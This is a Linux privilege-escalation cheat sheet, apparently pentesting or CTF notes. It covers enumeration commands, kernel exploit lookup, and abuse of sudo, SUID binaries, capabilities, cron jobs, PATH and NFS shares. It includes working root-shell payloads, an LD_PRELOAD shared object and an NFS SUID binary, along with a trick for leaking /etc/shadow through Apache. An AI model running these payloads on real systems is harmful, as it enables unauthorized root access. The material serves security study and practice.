# Priv Escalation in Linux

## Enumeration

### Manual enumeration

#### Check who you are

Instead of using `whoami` it makes sense to use `id` as it will provide uid, gid and group info in addition to your username:

`id`

#### Check hostname

Check hostname for clues about system role / naming convention used:

`hostname`

#### Check kernel

Check kernel info for clues against potential vulnerabilities that could lead to priv escalation:

`uname -a`

#### Check /proc entries

Check procfs entries for additional info about the system ie.:

- Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

`cat /proc/version`

- Looking at `/proc/cpuinfo` will give you information about system architecture, cpu cores, processors installed.

`cat /proc/cpuinfo`

#### Check /etc files

Most info about the system it's services and configuration may be found in `/etc`. Apart from service specific configuration files, which can hold a lot of interresting info, check basic ones:

- Password file will give out information about all users, their home directories and shells. This will help identify both service accounts, services installed as well as normal users.

`cat /etc/passwd`

- Check system MOTD / Issue - again to gain some recon about the system itself

```
cat /etc/issue
cat /etc/motd
```

#### Check running processes

`ps aux` or `ps -ef`

#### Check environment variables

`env`

#### Check all home directories

Check all home directories (and those outside of `/home` as well based on info from `/etc/passwd`), make sure you use `-a` to find hidden files/dirs:

`ls -a /home/*`

#### Check command history

Check command history. It can give out clues about services, other systems and accounts (ie. ssh) and sometimes secrets because of mistyping:

`history`

#### Check network info

- Check network interfaces:

`ifconfig -a`

- Check routes:

`route -n`

or

`ip route`

- Check all open ports:

`netstat -an`

- Check listening ports with pid and program name:

`netstat -ltp`

- Check interface statistics:

```
netstat -s
netstat -i
```

#### Search files

For simple searches, like flag files, try to use `locate` if available as it's quicker than `find`. However the latter gives you more flexibility and serch options and it's always present.

- Search for flags:

`find / -name flag*.txt 2>/dev/null`

- Search for 777 and 666 files:

```
find / -type f -perm 0777
find / -type f -perm 0666
```

- Search for recently modified files (ie. last 10 days):

`find / -mtime 10`

- Search for suid files:

`find / -perm -u=s -type f 2>/dev/null`

#### Check sudo

`sudo -l`

### Automated enumeration

Couple of tools to use for automated enumeration:
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker 

## Kernel exploits

1. Based on your findings, you can use Google or Exploit-db to search for an existing exploit code.
2. Sources such as https://www.cvedetails.com/ can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

TODO: Dirty c0w

## Privlidged/SUDO applications

### External file load

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).

Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file. 

### Exploit LD_PRELOAD

1. When doing `sudo -l` look for `env_keep+=LD_PRELOAD`.

2. Write a simple C shell:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

3.  Compile as  a share object (.so extension) file:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

4. Run the program by specifying the LD_PRELOAD option:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

## SUID

1. Find SUID binaries:

`find / -type f -perm -04000 -ls 2>/dev/null`

2. Compare executables on this list with GTFOBins (https://gtfobins.github.io)

3. Exploit!

## Capabilities

1. Use the `getcap` tool to list enabled capabilities:

`getcap -r / 2>/dev/null`

2. Check GTFObins, as it has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

3. Exploit!

## Cron jobs

1. Check cron tables for possible root jobs executing scripts that can be modified:

```
cat /etc/contab
ls -l /etc/cron.*
```

2. Modify scripts ie. spin a reverse shell

## PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

## NFS shares

1. Search for mountable r/w shares with no_squash_root option (on TARGET):

`showmount -e`

2. Mount share (on ATTACKBOX):

`mkdir /tmp/mount; mount -o rw <target>:/path/to/share`

3. Create a simple C shell (on ATTACKBOX):

```
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

4. Compile and set SUID bit (on ATTACKBOX):

```
gcc shell.c -o shell
chmod u+s shell
```

5. Run SUID shell on TARGET!
